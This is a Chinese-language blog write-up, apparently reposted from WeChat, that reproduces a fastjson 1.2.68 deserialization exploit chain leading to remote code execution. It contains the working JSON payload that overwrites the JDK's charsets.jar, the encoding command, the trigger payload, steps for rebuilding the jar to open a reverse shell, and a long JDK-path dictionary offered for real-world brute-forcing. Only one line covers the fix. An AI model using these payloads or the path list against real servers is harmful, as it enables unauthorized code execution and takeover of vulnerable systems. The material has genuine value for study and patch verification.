> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0yyZH_Axa0UTr8kquSixwQ)

### 0x00 前言

首先需要知道的是, 这是一条任意文件写入的利用链 (不受 autotype 限制), 而写入一个 jsp 文件放在现在的大多数情况下并不能够被解析, 而且也不知道要写在哪个位置, 难以利用.

fastjson-1.2.68 AutoCloseable 利用链其实公开也蛮久了, 但我是在前几个星期才又关注到, 以前没看懂文章... 加上近期 LandGrey 师傅分享的 "Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索" 这篇文章, fastjson-1.2.68 也终于有了一条完整的 RCE 利用链.

整个漏洞利用过程并不繁琐, 甚至比之前的 JNDI 注入简单一些. 但原理却很复杂, 我也只是大概理清楚师傅们的文章思路, 复现过程纯属照葫芦画瓢, 详细原理请移步文末参考文章, 本文不做过多介绍.

### 0x01 影响范围

*   fastjson<=1.2.68
    

### 0x02 复现详情

> #本文复现环境
> 
> centos7
> 
> apache-tomcat-8.5.65
> 
> fastjson-1.2.68
> 
> java-1.8

之前版本的 fastjson RCE 都是通过 JNDI 注入执行恶意代码, 受限于 jdk 版本; 而这条利用链根据 LandGrey 师傅收集的 jdk 目录与分享的利用代码, 推测是几乎很少受到限制, 但可能对应不同的场景仍需要一些小改动.

本文漏洞环境搭建用到的相关文件下载链接如下:

tomcat: https://ftp.jaist.ac.jp/pub/apache/tomcat/tomcat-8/v8.5.65/bin/apache-tomcat-8.5.65.tar.gz

fastjson 漏洞环境: https://pan.baidu.com/s/1C022L851nIkq4zy5hiG_TA

提取码: sven

fastjson-1.2.68.jar: https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.68/fastjson-1.2.68.jar

下载完成后解压 tomcat

然后将 fastjson1.2.47.tar.gz 拷贝到 tomcat 的 webapps 目录下解压.

```
tar -zxvf apache-tomcat-8.5.65.tar.gz
mv /apache-tomcat-8.5.65 /tomcat8
tar -zxvf fastjson1.2.47.tar.gz
```

如仍没搭建起来, 可参考如下文章中的 "方法二" 搭建.

https://blog.csdn.net/qq_40989258/article/details/103049474

(未复现过 fastjson1.2.47 版本漏洞也可顺便复现下)

完成后, 修改 tomcat/webapps/fastjson/META-INF/maven/com.vulhub.fastjson/fastjson/pom.xml 文件中的 fastjson 版本为 1.2.68

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQSsXMIRUplPzFB47g84icv6AmgcicX0mzrUEkpVJg8TgicJ9l6n3ibrrrzQ5J4foQ50XyUbY2rOwiaicoCQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQSsXMIRUplPzFB47g84icv6A71bwmgXF9ECEjzqxlsADrRI2roUmoK4PYNsae767jpJ1ChAnAySUzQ/640?wx_fmt=png)

拷贝一个 fastjson-1.2.68.jar 文件到靶机的 tomcat/webapps/fastjson/WEB-INF/lib 目录下.

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQSsXMIRUplPzFB47g84icv6AXA5lZOu1LAycJFeHsZQWFFAUr9aedDNibOnEWJpBcQbP6EEFolrFrhQ/640?wx_fmt=png)

**启动 / 关闭 tomcat**

(每次 Jar 包被触发后, 如需更改都需要重启 tomcat 初始化到未加载过相关利用 jar 包的状态)

```
./catalina.sh start
./catalina.sh stop
```

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQSsXMIRUplPzFB47g84icv6Afe7LFHujpibeibUdkfw5TWicRKwObVwvkK8ibPTuOhSgvB39DibqsvoqSMA/640?wx_fmt=png)

访问 http://127.0.0.1:8080/fastjson/ 出现 "Hello World" 即环境搭建正常.

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQSsXMIRUplPzFB47g84icv6AAM6j81jXvbvkWnGXEiasicP2rDmVpPrxLQXXRUnKjic869XoJBpgViaTkQ/640?wx_fmt=png)

**1.dnslog 验证下漏洞环境是否可用**

```
{"x":{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}}
```

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQSsXMIRUplPzFB47g84icv6AWr402M2Sq5IWAHp1Xw75u48U0icibuSuGZBiaPyvaKANGMhqLAyrOShMQ/640?wx_fmt=png)

**2. 下载漏洞利用 jar 包做处理**

https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks

将项目中的 spring-boot-upload-file-lead-to-rce-tricks-mainelease\charsets.jar 进行压缩编码处理.

(作者提供的 jar 包, 内置的代码执行后, 在 linux 环境下会在 /tmp 文件夹下创建测试文件)

```
cat charsets.jar | openssl zlib | base64 -w 0
```

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQSsXMIRUplPzFB47g84icv6Adv89UoAlMv3RJsWwZzuOXgB71mp8kWqJsHkcSyUEga6OXFCemStlUw/640?wx_fmt=png)

**3. 确认 java 安装目录, 找到其 lib 目录下 charsets.jar 的位置**

如: /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64/jre/lib/charsets.jar

(后面的 poc 会用到, 实战利用时需要通过字典去枚举 jdk 目录)

```
ls -lrt /etc/alternatives/java
```

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQSsXMIRUplPzFB47g84icv6AGPqia2RXbG8TeIPve0MSq7EjHRhuJ8Mzy1HtRKSUqzNGhfNA45KsTKA/640?wx_fmt=png)

**poc 改动参数说明:**

file 参数: 靶机上 jdk 中 charsets.jar 文件所在的完整路径

input 参数: 即上述编码处理后的 jar 包内容

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQSsXMIRUplPzFB47g84icv6AkybUCaM3IBnmKR54r5UqUicbbSo61fAFkXFhW75c68Sd1eHEg5GsibOA/640?wx_fmt=png)

**fastjson-1.2.68 版本任意文件写入 poc**

(如下 poc 会将一个名为 charsets.jar 的文件上传到指定的目录, 如果该文件已存在, 将进行覆写.)

```
{"x":{"@type":"java.lang.AutoCloseable","@type":"sun.rmi.server.MarshalOutputStream","out":{"@type":"java.util.zip.InflaterOutputStream","out":{"@type":"java.io.FileOutputStream","file":"/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64/jre/lib/charsets.jar","append":false},"infl":{"input":"xxx"},"bufLen":1048576},"protocolVersion":1}}
```

**4. 发包, 覆写靶机上 jdk 原本的 charsets.jar 文件**

(建议将源文件先进行备份)

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQSsXMIRUplPzFB47g84icv6AAk0stW01MuSBicUp64pnz8c1ehBdV6xe07miagKeIQsF7XWibuxtnfVxg/640?wx_fmt=png)

**charsets.jar 文件被覆写前后比对图**

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQSsXMIRUplPzFB47g84icv6AmcCFhLtJDNhZA1pM3icokSWstG0IwWf8ich9BahCe0yiaF98zLgt1y59A/640?wx_fmt=png)

**5. 触发漏洞**

需要注意的是, 同名 jar 包只能主动触发一次, 触发后再次进行覆写, 也不会在加载同名 jar 包.

```
{"x":{"@type":"java.nio.charset.Charset","val":"500"}}
```

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQSsXMIRUplPzFB47g84icv6AtC1q5VxmIUswaz8sgMZ7TGuCibjLdJ6mgHPq45zVtX6Gguibf3gNH8UQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQSsXMIRUplPzFB47g84icv6AicpNjnwbB25mfbiaoY0W6kjIrnaZzLHFW0wQ5IM2ruS1FvAVQkS2niaog/640?wx_fmt=png)

**6. 如何修改 jar 包?**

LandGrey 师傅提供了源码, 改下所要执行的命令重新生成恶意 jar 包即可.

详细步骤如下:

IDEA 新建一个名为 charsets 的普通项目

将 spring-boot-upload-file-lead-to-rce-tricks-main\charsets\src 下的两个目录拷贝进 src 目录下.

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQSsXMIRUplPzFB47g84icv6ADIRCRwS6g76Lib3gSjuTktj8xElOUMLQsYYhDOWjv7oibZAoxC9DSGhQ/640?wx_fmt=png)

看下 IBM33722.java 文件的源码, 相信这里的代码大家还是都能看懂的.

将 linux 部分中的命令改为反弹 shell 的命令即可.

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQSsXMIRUplPzFB47g84icv6AWvo2U3ic237Njxo1kUVUEqDyKX7EH3lWbooWrPTiaia9WSDcBkLXsPicFQ/640?wx_fmt=png)

重新打包成 jar 包.

ctrl+alt+shift+s 打开项目结构窗口, 配置如下图.

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQSsXMIRUplPzFB47g84icv6AcSCKxcw8Ngyuau1jILDJ0HBfTwMTxobXvwRK4BGbDvu9wGDibBRXqOA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQSsXMIRUplPzFB47g84icv6Aibcr51tf8zTsE2NIBvyz5raptq6ia6S6XbQjerRBe4Ofe1IhWEW87bjw/640?wx_fmt=png)

这里可以看到你的生成文件路径.

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQSsXMIRUplPzFB47g84icv6ATVox8jarO0vtf1S7ZNJuQianIQjXXOXsVZ49lgibRdhIADQjgZ0KW3Ig/640?wx_fmt=png)

生成修改后的 jar 包, 后面的操作重复前面的步骤即可, 不再复述.

最后附张反弹 shell 的截图.

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQSsXMIRUplPzFB47g84icv6AjuQVsia4bEjST2lO2T4BpcYziayfzAZg25R4WMkViazkZ2R3k2S0LicW3g/640?wx_fmt=png)

**常见 jdk 目录记录**

(来源于上述 github 项目作者整理)

```
/usr/lib/jvm/jre/lib/
/usr/local/jdk/jre/lib/
/usr/local/openjdk-6/lib/
/usr/local/openjdk-7/lib/
/usr/local/openjdk-8/lib/
/usr/lib/jvm/java/jre/lib/
/usr/lib/jvm/jdk6/jre/lib/
/usr/lib/jvm/jdk7/jre/lib/
/usr/lib/jvm/jdk8/jre/lib/
/usr/lib/jvm/jdk-11.0.3/lib/
/usr/lib/jvm/jdk1.6/jre/lib/
/usr/lib/jvm/jdk1.7/jre/lib/
/usr/lib/jvm/jdk1.8/jre/lib/
/usr/local/openjdk6/jre/lib/
/usr/local/openjdk7/jre/lib/
/usr/local/openjdk8/jre/lib/
/usr/local/openjdk-6/jre/lib/
/usr/local/openjdk-7/jre/lib/
/usr/local/openjdk-8/jre/lib/
/mnt/jdk/jdk1.8.0_191/jre/lib/
/usr/lib/jvm/jdk1.6.0/jre/lib/
/usr/lib/jvm/jdk1.7.0/jre/lib/
/usr/lib/jvm/jdk1.8.0/jre/lib/
/usr/java/jdk1.8.0_111/jre/lib/
/usr/java/jdk1.8.0_121/jre/lib/
/usr/lib/jvm/java-6-oracle/lib/
/usr/lib/jvm/java-7-oracle/lib/
/usr/lib/jvm/java-8-oracle/lib/
/usr/lib/jvm/java-1.6.0/jre/lib/
/usr/lib/jvm/java-1.7.0/jre/lib/
/usr/lib/jvm/java-1.8.0/jre/lib/
/usr/lib/jvm/jdk1.7.0_51/jre/lib/
/usr/lib/jvm/jdk1.7.0_76/jre/lib/
/usr/lib/jvm/jdk1.8.0_60/jre/lib/
/usr/lib/jvm/jdk1.8.0_66/jre/lib/
/usr/lib/jvm/jdk1.8.0_74/jre/lib/
/usr/lib/jvm/jdk1.8.0_91/jre/lib/
/usr/lib/jvm/oracle_jdk6/jre/lib/
/usr/lib/jvm/oracle_jdk7/jre/lib/
/usr/lib/jvm/oracle_jdk8/jre/lib/
/usr/lib/jvm/jdk1.8.0_101/jre/lib/
/usr/lib/jvm/jdk1.8.0_102/jre/lib/
/usr/lib/jvm/jdk1.8.0_111/jre/lib/
/usr/lib/jvm/jdk1.8.0_131/jre/lib/
/usr/lib/jvm/jdk1.8.0_144/jre/lib/
/usr/lib/jvm/jdk1.8.0_151/jre/lib/
/usr/lib/jvm/jdk1.8.0_152/jre/lib/
/usr/lib/jvm/jdk1.8.0_161/jre/lib/
/usr/lib/jvm/jdk1.8.0_171/jre/lib/
/usr/lib/jvm/jdk1.8.0_172/jre/lib/
/usr/lib/jvm/jdk1.8.0_181/jre/lib/
/usr/lib/jvm/jdk1.8.0_191/jre/lib/
/usr/lib/jvm/jdk1.8.0_202/jre/lib/
/usr/lib/jvm/jdk8u202-b08/jre/lib/
/usr/lib/jvm/jre-6-oracle-x64/lib/
/usr/lib/jvm/jre-7-oracle-x64/lib/
/usr/lib/jvm/jre-8-oracle-x64/lib/
/usr/lib/jvm/zulu-6-amd64/jre/lib/
/usr/lib/jvm/zulu-7-amd64/jre/lib/
/usr/lib/jvm/zulu-8-amd64/jre/lib/
/usr/lib/jvm/java-6-oracle/jre/lib/
/usr/lib/jvm/java-7-oracle/jre/lib/
/usr/lib/jvm/java-8-oracle/jre/lib/
/usr/jdk/instances/jdk1.6.0/jre/lib/
/usr/jdk/instances/jdk1.7.0/jre/lib/
/usr/jdk/instances/jdk1.8.0/jre/lib/
/usr/lib/jvm/j2re1.6-oracle/jre/lib/
/usr/lib/jvm/j2re1.7-oracle/jre/lib/
/usr/lib/jvm/j2re1.8-oracle/jre/lib/
/usr/lib/jvm/java-1.6.0-sun/jre/lib/
/usr/lib/jvm/java-1.7.0-sun/jre/lib/
/usr/lib/jvm/java-1.8.0-sun/jre/lib/
/usr/lib/jvm/java-6-openjdk/jre/lib/
/usr/lib/jvm/java-7-openjdk/jre/lib/
/usr/lib/jvm/java-8-openjdk/jre/lib/
/usr/lib/jvm/j2sdk1.6-oracle/jre/lib/
/usr/lib/jvm/j2sdk1.7-oracle/jre/lib/
/usr/lib/jvm/j2sdk1.8-oracle/jre/lib/
/usr/lib/jvm/java-11-openjdk/jre/lib/
/usr/lib/jvm/java-12-openjdk/jre/lib/
/usr/lib/jvm/java-13-openjdk/jre/lib/
/usr/lib/jvm/java-1.6-openjdk/jre/lib/
/usr/lib/jvm/java-1.7-openjdk/jre/lib/
/usr/lib/jvm/java-1.8-openjdk/jre/lib/
/usr/lib/jvm/java-9-openjdk-amd64/lib/
/usr/lib/jvm/jdk-6-oracle-x64/jre/lib/
/usr/lib/jvm/jdk-7-oracle-x64/jre/lib/
/usr/lib/jvm/jdk-8-oracle-x64/jre/lib/
/usr/lib/jvm/jre-6-oracle-x64/jre/lib/
/usr/lib/jvm/jre-7-oracle-x64/jre/lib/
/usr/lib/jvm/jre-8-oracle-x64/jre/lib/
/usr/lib/jvm/java-10-openjdk-amd64/lib/
/usr/lib/jvm/java-11-openjdk-amd64/lib/
/usr/lib/jvm/java-1.11.0-openjdk/jre/lib/
/usr/lib/jvm/java-1.12.0-openjdk/jre/lib/
/usr/lib/jvm/java-6-openjdk-i386/jre/lib/
/usr/lib/jvm/java-6-sun-1.6.0.16/jre/lib/
/usr/lib/jvm/java-6-sun-1.6.0.20/jre/lib/
/usr/lib/jvm/java-7-openjdk-i386/jre/lib/
/usr/lib/jvm/java-8-openjdk-i386/jre/lib/
/usr/lib/jvm/java-6-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-7-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-1.6.0-oracle-x64/jre/lib/
/usr/lib/jvm/java-1.7.0-oracle-x64/jre/lib/
/usr/lib/jvm/java-1.8.0-oracle-x64/jre/lib/
/usr/lib/jvm/oracle-java6-jdk-amd64/jre/lib/
/usr/lib/jvm/oracle-java7-jdk-amd64/jre/lib/
/usr/lib/jvm/oracle-java8-jdk-amd64/jre/lib/
/usr/lib64/jvm/java-1.6.0-ibd-1.6.0/jre/lib/
/usr/lib64/jvm/java-1.6.0-ibm-1.6.0/jre/lib/
/usr/lib64/jvm/java-1.7.1-ibm-1.7.1/jre/lib/
/usr/lib/jvm/java-1.6.0-sun-1.6.0.11/jre/lib/
/usr/lib/jvm/java-1.6.0-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-amd64/jre/lib/
/usr/lib/jvm/jre-1.6.0-openjdk.x86_64/jre/lib/
/usr/lib/jvm/jre-1.7.0-openjdk.x86_64/jre/lib/
/usr/lib/jvm/jre-1.8.0-openjdk.x86_64/jre/lib/
/usr/lib/jvm/java-1.11.0-openjdk-amd64/jre/lib/
/usr/lib/jvm/jdk-8-oracle-arm-vfp-hflt/jre/lib/
/usr/lib64/jvm/java-1.6.0-openjdk-1.6.0/jre/lib/
/usr/lib64/jvm/java-1.7.0-openjdk-1.7.0/jre/lib/
/usr/lib64/jvm/java-1.8.0-openjdk-1.8.0/jre/lib/
/usr/lib/jvm/java-1.6.0-openjdk-1.6.0.0.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.8.0.0.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-amazon-corretto.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.0.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.45.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.65.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.75.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.79.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.91.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.101.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.191.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.31-2.b13.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.65-3.b17.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.102-4.b14.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-2.b14.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-7.b10.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-11.b12.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.31-1.b13.el6_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.65-2.b17.el7_1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.77-0.b03.el6_7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.91-0.b14.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.101-3.b13.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.102-1.b14.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-0.b15.el6_8.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-1.b15.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-2.b15.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.121-0.b13.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-0.b11.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-2.b11.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-3.b12.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.141-1.b16.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.141-3.b16.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.144-0.b01.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.144-0.b01.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-5.b12.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-0.b14.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-3.b14.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-3.b10.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-3.b13.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-3.b13.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-1.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.201.b09-0.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.201.b09-2.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.222.b10-0.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-3.b13.el6_10.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el6_10.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.el6_10.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.31-2.b13.5.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.65-2.b17.7.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.77-0.b03.9.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.101-2.6.6.1.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.131-2.6.9.0.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.91-0.b14.10.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.171-2.6.13.0.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.191-2.6.15.4.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.101-3.b13.24.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-1.b15.25.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.121-0.b13.29.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-2.b11.30.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.141-1.b16.32.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.35.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-0.b14.36.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-7.b10.37.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.38.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.42.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.201.b09-0.43.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.45.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el7_5.x86_64-debug/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-8.b13.39.39.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el7_5.x86_64-debug/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el6_10.x86_64-debug/jre/lib/
```

### 0x03 漏洞修复

*   升级 fajston 至最新版本
    

### 0x04 踩过的坑

*   触发漏洞的 poc 一定要放在最后执行.
    
*   复现失败时, 记得重启 tomcat, 保证恶意 jar 包可以被重新加载.
    
*   使用命令打包的恶意 jar 包一直没成功, 不知道为啥, 不清楚原理的话还是建议用开发工具打包.
    
*   实战利用时, 可先将 jdk 目录字典全都跑一遍, 然后再发送触发漏洞的 poc.
    

### 0x05 参考文章

*   https://b1ue.cn/archives/382.html
    
*   [https://mp.weixin.qq.com/s/R7Q2CZFZv4DdyysJ6WHc1A](https://mp.weixin.qq.com/s?__biz=MzUzMjQyMDE3Ng==&mid=2247484408&idx=1&sn=fc7230f61a248945721def0f63bab431&scene=21#wechat_redirect)
    
*   [https://mp.weixin.qq.com/s/wdOb5ESfbkMSfdDlRvOg-g](https://mp.weixin.qq.com/s?__biz=MzUzMjQyMDE3Ng==&mid=2247484413&idx=1&sn=1e6e6dc310896678a64807ee003c4965&scene=21#wechat_redirect)
    
*   https://landgrey.me/blog/22/
    
*   https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks
    

说明: 文章不保证内容完全准确, 文中如有错误还请多多指出, 共同进步.

公众号